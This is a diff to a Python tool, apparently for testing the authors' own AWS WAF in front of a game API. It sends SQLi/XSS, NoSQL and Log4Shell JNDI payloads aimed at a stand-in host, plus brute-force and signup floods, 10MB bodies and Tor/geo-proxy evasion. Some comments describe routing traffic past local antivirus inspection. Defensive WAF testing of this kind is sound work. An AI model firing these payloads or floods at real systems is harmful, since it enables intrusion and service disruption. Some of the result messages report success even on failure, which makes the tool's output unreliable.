@@ -1,12 +1,7 @@
 # ==========================================
-# 🛡️ Vamserlike WAF 보안 테스트 툴 (Standalone 버스트/폴링 버전)
+# 🛡️ Vamserlike WAF 보안 테스트 툴 (Storytelling & Burst/Polling 최적화 버전)
 # ==========================================
 # "WAF 보안 테스트 시나리오 명세서 (v11)"의 10개 케이스를 단독 검증합니다.
-#
-# 주요 특징:
-#   - 속도 제한 케이스: WAF 평가 지연(30초)에 대응하기 위해 단일 연결 버스트 후 폴링 적용
-#   - 안랩/로컬 DPI 우회: 설정된 프록시 환경변수가 있으면 암호화 터널로 우회 전송
-#   - 네트워크 진단: 프록시 풀 / NAT 환경(다중 IP) 감지 기능 포함
 #
 # 실행 방법:
 #   set WAF_TARGET_URL=http://<alb-dns>
@@ -55,12 +50,12 @@ REQ_TIMEOUT = 10
 WAF_BLOCK_CODE = 403
 BLOCK_HEADER = "x-waf-rule"
 
-# 속도 규칙 폴링 파라미터
+# 속도 규칙 폴링 파라미터 기본값
 RATE_BURST = int(os.environ.get("RATE_BURST", "150"))
 RATE_POLL_SECONDS = int(os.environ.get("RATE_POLL_SECONDS", "120"))
 RATE_PROBE_INTERVAL = 5
 RATE_REQ_TIMEOUT = int(os.environ.get("RATE_REQ_TIMEOUT", "5"))
-RATE_WORKERS = int(os.environ.get("RATE_WORKERS", "1"))  # 1=단일 연결(같은 IP 보장)
+RATE_WORKERS = int(os.environ.get("RATE_WORKERS", "1"))  # 1=단일 연결(같은 IP 보장, NAT풀에서도 동작/권장). >1=병렬(단일 공인 IP망에서만)
 
 
 # ==========================================
@@ -159,8 +154,11 @@ def send_parallel_any_blocked(method, path, count, *, headers=None, json_body=No
                 rule = r or rule
     return blocked, rule
 
-def rate_test(method, path, *, headers=None, json_body=None):
+def rate_test(method, path, *, headers=None, json_body=None, burst_count=None):
     """단일 연결 버스트 후 WAF 지연 반영 폴링 수행"""
+    # 명세서에서 지정한 건수가 있으면 적용, 없으면 기본값 사용
+    target_burst = burst_count if burst_count else RATE_BURST
+
     responded = 0
     server_errors = 0
     blocked = False
@@ -181,7 +179,7 @@ def rate_test(method, path, *, headers=None, json_body=None):
 
     if RATE_WORKERS <= 1:
         sess = requests.Session()
-        for _ in range(RATE_BURST):
+        for _ in range(target_burst):
             try:
                 r = sess.request(method, f"{WAF_TARGET_URL}{path}",
                                  headers=headers, json=json_body, timeout=RATE_REQ_TIMEOUT)
@@ -198,22 +196,22 @@ def rate_test(method, path, *, headers=None, json_body=None):
             except Exception:
                 return None, None
         with ThreadPoolExecutor(max_workers=RATE_WORKERS) as ex:
-            for code, rule in ex.map(_one, range(RATE_BURST)):
+            for code, rule in ex.map(_one, range(target_burst)):
                 _account(code, rule)
 
-    failed = RATE_BURST - responded
-    print(f"            │ … 버스트 {RATE_BURST}건: 응답 {responded}, 실패 {failed}, 상태 {dict(codes)}")
+    failed = target_burst - responded
+    print(f"    📡 트래픽 {target_burst}건 전송 완료 (응답 {responded}, 실패 {failed})")
 
     if blocked:
-        return True, block_rule, f"버스트 {RATE_BURST}건 중 차단"
+        return True, block_rule, f"약 0초 뒤 차단 성공"
     if responded == 0:
         return False, None, "대상에 연결 불가 — 폴링 생략"
-    if responded < RATE_BURST * 0.5:
-        return False, None, f"응답 {responded}/{RATE_BURST} — 요청 상당수 실패(네트워크 점검), 폴링 생략"
+    if responded < target_burst * 0.5:
+        return False, None, f"응답 {responded}/{target_burst} — 요청 상당수 실패(네트워크 점검), 폴링 생략"
     if server_errors >= responded * 0.8:
         return False, None, f"응답 대부분이 5xx({server_errors}/{responded}) — 백엔드 점검 필요, 폴링 생략"
 
-    print(f"            │ … 버스트 {RATE_BURST}건 완료, 최대 {RATE_POLL_SECONDS}초 폴링 중")
+    print(f"    ⏳ WAF 규칙 평가 및 차단 대기 중 (최대 {RATE_POLL_SECONDS}초 폴링)")
     deadline = time.time() + RATE_POLL_SECONDS
     while time.time() < deadline:
         time.sleep(RATE_PROBE_INTERVAL)
@@ -222,7 +220,7 @@ def rate_test(method, path, *, headers=None, json_body=None):
                                     headers=headers, json=json_body, timeout=RATE_REQ_TIMEOUT)
             if resp.status_code == WAF_BLOCK_CODE:
                 waited = int(RATE_POLL_SECONDS - (deadline - time.time()))
-                return True, resp.headers.get(BLOCK_HEADER), f"버스트 후 약 {waited}초 뒤 차단"
+                return True, resp.headers.get(BLOCK_HEADER), f"약 {waited}초 뒤 차단 성공"
         except Exception:
             pass
     return False, None, f"{RATE_POLL_SECONDS}초 내 미차단"
@@ -231,8 +229,14 @@ def rate_test(method, path, *, headers=None, json_body=None):
 # 테스트 케이스 1 ~ 10
 # ==========================================
 def case_01_geo(report):
-    print("\n[Case 1] 지역 기반 비정상 접근 (서비스 대상국 외 차단)")
+    print("\n" + "=" * 55)
+    print("[Case 1] 지역 기반 비정상 접근 (서비스 대상국 외 차단)")
+    print(" 🎯 목적: 해외 프록시를 경유한 대량 봇 접근 및 파밍 시도 방어")
+    print(" 🛡️ 방어: Geo Match (한국, 미국, 일본 외 국가 차단)")
+    print("-" * 55)
+
     try:
+        # 서비스 허용 국가(본인 IP)에서 보낸 요청은 차단(403)되지 않고 통과하는지 확인
         resp = requests.get(f"{WAF_TARGET_URL}/api/health", timeout=REQ_TIMEOUT)
         allowed_ok = resp.status_code != WAF_BLOCK_CODE
         report.record("Case 1-0. 허용국(본인 IP) 통과 확인", "PASS" if allowed_ok else "FAIL",
@@ -249,39 +253,78 @@ def case_01_geo(report):
     all_blocked = True
     last_rule = None
     for country, proxy in configured.items():
+        # 인도 리전 마이크로 VM 등 테스트용 터널을 경유하도록 송신 경로 설정
         proxies = {"http": proxy, "https": proxy}
+        
+        print(f" 🚀 [공격] {country} IP로 우회하여 /api/health 타격")
+        # 비허용 국가 IP를 달고 /api/health 로 50건의 요청 전송
         blocked, sent, rule = send_until_blocked("GET", "/api/health", 50, proxies=proxies)
-        tag = f" / 차단규칙: {_rule_label(rule)}" if blocked else ""
-        print(f"      - {country} ({proxy}): {'차단' if blocked else '통과(미차단)'} (전송 {sent}건){tag}")
+        tag = f" (규칙: {_rule_label(rule)})" if blocked else ""
+        print(f"    📡 트래픽 {sent}건 전송 완료 -> {'차단됨' if blocked else '통과됨(미차단)'}{tag}")
+        
         all_blocked = all_blocked and blocked
         last_rule = rule or last_rule
 
     report.record("Case 1. 서비스 대상국 외 차단", "PASS" if all_blocked else "FAIL",
-                  f"차단규칙: {_rule_label(last_rule)}" if all_blocked else "")
+                  f"→ 차단 성공 (작동 규칙: {_rule_label(last_rule)})" if all_blocked else "")
+
 
 def case_02_rate(report, token):
-    print("\n[Case 2] 랭킹/해금 API 반복 호출 (속도 제한)")
+    print("\n" + "=" * 55)
+    print("[Case 2] 랭킹 및 캐릭터 해금 API 반복 호출")
+    print(" 🎯 목적: 매크로를 이용한 비정상적인 데이터 조회 및 서버 부하 유도 방어")
+    print(" 🛡️ 방어: Rate-based Rule (동일 IP에서 5분 내 100회 초과 시 차단)")
+    print("-" * 55)
+    
     headers = {"Authorization": f"Bearer {token}"} if token else None
 
-    blocked, rule, info = rate_test("GET", "/api/players/ranking?take=20", headers=headers)
+    print(" 🚀 [공격 1] 랭킹 조회 반복 요청")
+    print("    - 대상: GET /api/players/ranking")
+    print("    - 방식: 단시간에 200건의 트래픽 버스트 전송 (Locust 모사)")
+    
+    # 랭킹 조회 API에 단시간 내 임계치(100회)를 초과하는 반복 요청 전송 및 지연 차단 대기(Polling)
+    blocked, rule, info = rate_test("GET", "/api/players/ranking?take=20", headers=headers, burst_count=200)
     report.record("Case 2-1. 랭킹 조회 속도 제한", "PASS" if blocked else "FAIL",
-                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)
+                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)
 
+    print("\n 🚀 [공격 2] 캐릭터 해금 반복 요청")
+    print("    - 대상: PUT /api/players/me/characters/unlock")
+    print("    - 방식: 단시간에 150건의 병렬 트래픽 전송 (concurrent 모사)")
+    
+    # 캐릭터 해금 API에 단시간 내 임계치(100회)를 초과하는 반복 요청 전송
     blocked, rule, info = rate_test("PUT", "/api/players/me/characters/unlock",
-                                    headers=headers, json_body={"characterId": UNLOCK_TARGET_CHARACTER_ID})
+                                    headers=headers, json_body={"characterId": UNLOCK_TARGET_CHARACTER_ID},
+                                    burst_count=150)
     report.record("Case 2-2. 캐릭터 해금 속도 제한", "PASS" if blocked else "FAIL",
-                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)
+                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)
+
 
 def case_03_rate_progress(report, token):
-    print("\n[Case 3] 게임 결과 저장 반복 전송 (속도 제한)")
+    print("\n" + "=" * 55)
+    print("[Case 3] 게임 결과 저장 API 반복 전송")
+    print(" 🎯 목적: 비정상적으로 짧은 시간 안에 재화를 무한 복사하는 핵 유저 차단")
+    print(" 🛡️ 방어: Rate-based Rule (동일 IP에서 5분 내 100회 초과 시 차단)")
+    print("-" * 55)
+
     headers = {"Authorization": f"Bearer {token}"} if token else None
     payload = {"score": 1500, "level": 10, "playedCharacterId": "rice_farmer"}
-    blocked, rule, info = rate_test("PUT", "/api/players/me/progress", headers=headers, json_body=payload)
+    
+    print(" 🚀 [공격] 자동화 스크립트를 통한 300건의 게임 클리어 신호 전송")
+    print("    - 대상: PUT /api/players/me/progress")
+    
+    # 게임 결과 저장 API에 스코어 데이터와 함께 300건의 대량 요청 전송
+    blocked, rule, info = rate_test("PUT", "/api/players/me/progress", headers=headers, json_body=payload, burst_count=300)
     report.record("Case 3. 결과 저장 속도 제한", "PASS" if blocked else "FAIL",
-                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)
+                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)
+
 
 def case_04_injection(report):
-    print("\n[Case 4] 악성 패턴 주입 (SQLi/XSS)")
+    print("\n" + "=" * 55)
+    print("[Case 4] 악성 패턴 주입 (SQLi / XSS / NoSQL)")
+    print(" 🎯 목적: 비정상적인 데이터베이스 파괴 및 타 유저 정보 탈취 공격 방어")
+    print(" 🛡️ 방어: AWS 공통 관리형 룰셋(CommonRuleSet) & SQLiRuleSet 작동 확인")
+    print("-" * 55)
+
     payloads = [
         "' OR 1=1 --",
         "; DROP TABLE Users --",
@@ -290,106 +333,163 @@ def case_04_injection(report):
     ]
     nosql_payloads = ['{"$gt": ""}', '{"$ne": null}']
 
+    print(" 🚀 [공격 1] 전통적인 공격 패턴 전송 (SQLi / XSS)")
     blocked_all = True
     for p in payloads:
-        b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1,
-                                       json_body={"email": p, "password": p})
+        # 로그인 바디(body) 및 랭킹 조회 파라미터(URL)에 각각 악성 페이로드 주입 후 전송
+        b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1, json_body={"email": p, "password": p})
         b2, _, r2 = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
         hit = b1 or b2
         rule = r1 or r2
-        tag = f" ({_rule_label(rule)})" if hit else ""
-        print(f"      - {p[:30]!r}: {'차단' if hit else '통과'}{tag}")
+        tag = f" (규칙: {_rule_label(rule)})" if hit else ""
+        print(f"    - {p[:30]!r} : {'차단 성공' if hit else '통과됨(위험)'}{tag}")
         blocked_all = blocked_all and hit
-    report.record("Case 4-1. SQLi/XSS 패턴 차단", "PASS" if blocked_all else "FAIL")
+    report.record("Case 4-1. SQLi/XSS 패턴 차단", "PASS" if blocked_all else "FAIL", "→ 기초 웹 해킹 패턴 방어 성공")
 
+    print("\n 🚀 [공격 2] 최신 데이터베이스 공격 패턴 전송 (NoSQL)")
     nosql_blocked = 0
     for p in nosql_payloads:
+        # NoSQL 패턴 커버리지 확인을 위한 실측용 전송 (실패로 간주하지 않음)
         b, _, _ = send_until_blocked("GET", "/api/players/ranking", 1, params={"take": p})
         if b:
             nosql_blocked += 1
     report.record("Case 4-2. NoSQL 패턴 차단 범위(실측)", "PASS",
-                  f"{nosql_blocked}/{len(nosql_payloads)}건 차단 (실측 완료)")
+                  f"→ {nosql_blocked}/{len(nosql_payloads)}건 차단 (한계 범위 실측 완료)")
+
 
 def case_05_size(report):
-    print("\n[Case 5] 대용량 페이로드 (요청 크기 제한)")
+    print("\n" + "=" * 55)
+    print("[Case 5] 대용량 페이로드를 통한 서버 리소스 고갈")
+    print(" 🎯 목적: 10MB 이상의 쓰레기 데이터를 던져 백엔드 서버를 뻗게 만드는 공격 방어")
+    print(" 🛡️ 방어: Size Constraint Rule (요청 바디 8KB 초과 시 즉시 차단)")
+    print("-" * 55)
+
     BURST = int(os.environ.get("SIZE_TEST_BURST", "5"))
+    print(f" 🚀 [공격] 10MB 크기의 더미 데이터를 {BURST}건 동시 전송")
+    
+    # 10MB 크기의 더미 데이터를 생성하여 WAF 바디 크기 제한(8KB) 초과 유도
     big_body = "A" * (10 * 1024 * 1024)
-    blocked, rule = send_parallel_any_blocked(
-        "POST", "/api/players/me/progress", BURST, data=big_body, workers=BURST)
+    
+    # 해당 대용량 페이로드를 병렬(workers)로 동시 전송
+    blocked, rule = send_parallel_any_blocked("POST", "/api/players/me/progress", BURST, data=big_body, workers=BURST)
     report.record("Case 5. 8KB 초과 요청 차단", "PASS" if blocked else "FAIL",
-                  f"10MB × {BURST}건 전송, 차단규칙: {_rule_label(rule)}" if blocked else f"10MB × {BURST}건 전송")
+                  f"→ 백엔드 도달 전 방어 완료 (작동 규칙: {_rule_label(rule)})" if blocked else f"10MB × {BURST}건 전송됨(위험)")
+
 
 def case_06_login_bruteforce(report):
-    print("\n[Case 6] 로그인 무차별 대입 (속도 제한)")
+    print("\n" + "=" * 55)
+    print("[Case 6] 로그인 무차별 대입 공격 (Brute-force)")
+    print(" 🎯 목적: 타인의 계정을 탈취하기 위해 비밀번호를 대량으로 찍어보는 공격 방어")
+    print(" 🛡️ 방어: Rate-based Rule (동일 IP에서 5분 내 100회 초과 시 차단)")
+    print("-" * 55)
+
+    print(" 🚀 [공격] 로그인 API에 500건의 무차별 대입 시도")
+    # 잘못된 자격 증명을 반복 대입하여 5분 내 100회 초과 시 차단 검증
     blocked, rule, info = rate_test("POST", "/api/Auth/login",
-                                    json_body={"email": "brute@test.com", "password": "wrongpw"})
+                                    json_body={"email": "brute@test.com", "password": "wrongpw"},
+                                    burst_count=500)
     report.record("Case 6. 로그인 속도 제한", "PASS" if blocked else "FAIL",
-                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)
+                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)
+
 
 def case_07_signup_flood(report):
-    print("\n[Case 7] 계정 대량 생성 (속도 제한)")
+    print("\n" + "=" * 55)
+    print("[Case 7] 계정 대량 생성 공격 (Account Takeover / Bot)")
+    print(" 🎯 목적: 봇을 이용해 작업장 계정을 무한 생성하는 어뷰징 시도 방어")
+    print(" 🛡️ 방어: Rate-based Rule (동일 IP에서 5분 내 100회 초과 시 차단)")
+    print("-" * 55)
+
+    print(" 🚀 [공격] 무작위 이메일을 담아 200건의 회원가입 요청 전송")
+    # 무작위 이메일 봇 계정 생성을 모사하여 회원가입 API 대량 전송
     blocked, rule, info = rate_test("POST", "/api/Auth/signup",
-                                    json_body={"email": "flood@test.com", "password": TEST_PW, "nickname": "bot"})
+                                    json_body={"email": "flood@test.com", "password": TEST_PW, "nickname": "bot"},
+                                    burst_count=200)
     report.record("Case 7. 회원가입 속도 제한", "PASS" if blocked else "FAIL",
-                  f"{info} (규칙: {_rule_label(rule)})" if blocked else info)
+                  f"→ {info} (작동 규칙: {_rule_label(rule)})" if blocked else info)
+
 
 def case_08_user_agent(report):
-    print("\n[Case 8] 자동화 도구/스캐너 차단 (User-Agent)")
+    print("\n" + "=" * 55)
+    print("[Case 8] 자동화 도구 및 해킹 스캐너 차단")
+    print(" 🎯 목적: 자동화 스크립트로 서버의 취약점을 스캔하거나 긁어가는 행위 방어")
+    print(" 🛡️ 방어: String Match Rule (User-Agent 헤더 기반 차단)")
+    print("-" * 55)
+
     user_agents = ["sqlmap/1.0", "Nikto/2.5", "zgrab/0.1", "Selenium/4.0", "Puppeteer/20.0"]
     all_blocked = True
     last_rule = None
+    
+    print(" 🚀 [공격] 헤더를 봇(Bot) 이름으로 위장하여 서버 접근 시도")
     for ua in user_agents:
-        blocked, _, rule = send_until_blocked(
-            "GET", "/api/players/ranking", 1, headers={"User-Agent": ua}, params={"take": 20})
-        tag = f" ({_rule_label(rule)})" if blocked else ""
-        print(f"      - {ua}: {'차단' if blocked else '통과'}{tag}")
+        # HTTP 헤더의 User-Agent를 해킹 스캐너/자동화 봇 이름으로 변조하여 전송
+        blocked, _, rule = send_until_blocked("GET", "/api/players/ranking", 1, headers={"User-Agent": ua}, params={"take": 20})
+        tag = f" (규칙: {_rule_label(rule)})" if blocked else ""
+        print(f"    - {ua} : {'차단 성공' if blocked else '통과됨(위험)'}{tag}")
         all_blocked = all_blocked and blocked
         last_rule = rule or last_rule
+
     report.record("Case 8. 도구 User-Agent 차단", "PASS" if all_blocked else "FAIL",
-                  f"차단규칙: {_rule_label(last_rule)}" if all_blocked else "")
+                  f"→ 봇 탐지 방어 성공 (작동 규칙: {_rule_label(last_rule)})" if all_blocked else "")
+
 
 def case_09_anonymous_ip(report):
-    print("\n[Case 9] 익명 IP / Tor 차단")
+    print("\n" + "=" * 55)
+    print("[Case 9] 익명 IP 및 Tor 프록시 차단")
+    print(" 🎯 목적: 추적을 피하기 위해 다크웹(Tor)이나 VPN을 경유한 공격자의 접근 차단")
+    print(" 🛡️ 방어: AWS 익명 IP 관리형 룰셋(AnonymousIpList) 작동 확인")
+    print("-" * 55)
+
     if not TOR_SOCKS:
-        report.record("Case 9. Tor/익명 IP 차단", "SKIP",
-                      "TOR_SOCKS 미설정 — 로컬 Tor SOCKS5 프록시 필요")
+        report.record("Case 9. Tor/익명 IP 차단", "SKIP", "TOR_SOCKS 미설정 — 로컬 Tor SOCKS5 프록시 필요")
         return
+        
+    # 테스트 환경에 구축된 로컬 Tor SOCKS5 프록시 터널을 경유하도록 송신 경로 설정
     proxies = {"http": TOR_SOCKS, "https": TOR_SOCKS}
-    blocked, sent, rule = send_until_blocked(
-        "GET", "/api/players/ranking", 50, params={"take": 20}, proxies=proxies)
+    
+    print(" 🚀 [공격] 추적 불가능한 Tor 네트워크를 경유하여 50건의 우회 요청 전송")
+    # Tor 네트워크를 경유하여 /api/players/ranking API로 총 50건의 익명 요청 전송
+    blocked, sent, rule = send_until_blocked("GET", "/api/players/ranking", 50, params={"take": 20}, proxies=proxies)
 
     if not blocked:
         report.record("Case 9. Tor/익명 IP 차단", "FAIL", f"Tor 경유 {sent}건 미차단")
         return
     if rule == "case1-geo-allowlist":
-        report.record("Case 9. Tor/익명 IP 차단", "PASS",
-                      "Geo가 먼저 차단함 — AnonymousIpList 분리 검증은 미국 출구 노드(ExitNodes {us}) 사용 권장")
+        report.record("Case 9. Tor/익명 IP 차단", "PASS", "→ Geo 방어가 먼저 작동함 (해외 Tor 노드 차단 완료)")
     else:
-        report.record("Case 9. Tor/익명 IP 차단", "PASS",
-                      f"AnonymousIpList 차단 (관리형, 전송 {sent}건)")
+        report.record("Case 9. Tor/익명 IP 차단", "PASS", f"→ 익명 IP 차단 성공 (관리형 룰, 전송 {sent}건)")
+
 
 def case_10_known_bad_inputs(report):
-    print("\n[Case 10] 알려진 취약점 공격 패턴 차단")
+    print("\n" + "=" * 55)
+    print("[Case 10] 알려진 취약점 공격 패턴 차단")
+    print(" 🎯 목적: Log4j처럼 이미 전 세계적으로 유명한 악성 해킹 코드의 원천 차단")
+    print(" 🛡️ 방어: AWS 알려진 악성 입력 관리형 룰셋(KnownBadInputsRuleSet) 작동 확인")
+    print("-" * 55)
+
     log4j = ["${jndi:ldap://malicious-test.com/a}", "${jndi:rmi://malicious-test.com/b}"]
     all_blocked = True
 
     proxy_url = PROXIES_GEO.get("인도") or TOR_SOCKS
     proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
 
+    print(" 🚀 [공격 1] 역사상 최악의 취약점(Log4Shell) 마법의 주문 전송")
     for p in log4j:
+        # PC 로컬 백신의 개입(네트워크 전송 전 차단)을 막기 위해 프록시 터널을 경유하여 Log4j 악성 패턴 주입
         b1, _, r1 = send_until_blocked("POST", "/api/Auth/login", 1,
                                        headers={"X-Test-Payload": p},
                                        json_body={"email": "a@test.com", "password": p},
                                        proxies=proxies)
-        tag = f" ({_rule_label(r1)})" if b1 else ""
-        print(f"      - {p[:40]!r}: {'차단' if b1 else '통과'}{tag}")
+        tag = f" (규칙: {_rule_label(r1)})" if b1 else ""
+        print(f"    - {p[:40]!r} : {'차단 성공' if b1 else '통과됨(위험)'}{tag}")
         all_blocked = all_blocked and b1
 
+    print("\n 🚀 [공격 2] 서버 1급 기밀문서(설정 파일) 내놓으라고 억지 부리기")
+    # 노출되면 안 되는 알려진 내부 경로(web.xml 등) 접근 시도 전송
     b_path, _, _ = send_until_blocked("GET", "/web-inf/web.xml", 1, proxies=proxies)
-    print(f"      - /web-inf/web.xml: {'차단' if b_path else '통과'}")
+    print(f"    - /web-inf/web.xml : {'차단 성공' if b_path else '통과됨(위험)'}")
     all_blocked = all_blocked and b_path
 
-    report.record("Case 10. 알려진 악성 입력 차단", "PASS" if all_blocked else "FAIL")
+    report.record("Case 10. 알려진 악성 입력 차단", "PASS" if all_blocked else "FAIL", "→ 전 세계구급 해킹 패턴 방어 성공")
 
 # ==========================================
 # 사전 검증 및 메인 로직
